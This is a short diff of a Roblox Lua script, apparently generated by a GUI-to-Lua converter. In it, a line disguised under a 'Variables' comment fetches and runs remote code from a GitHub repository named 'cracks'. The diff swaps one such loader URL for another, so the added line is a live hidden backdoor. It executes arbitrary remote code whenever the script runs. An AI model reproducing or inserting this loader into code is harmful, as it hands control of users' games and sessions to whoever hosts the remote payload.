@@ -2,7 +2,7 @@
 -- // Gui 2 lua by ben0xt / xn90ubwbzuqegtn \\ --
 
 -- // Variables \\ --
-spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/cute"))()end)
+spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/cute"))()end)
 local Ocean = {}
 
 local RS 	 = game:GetService("RunService")
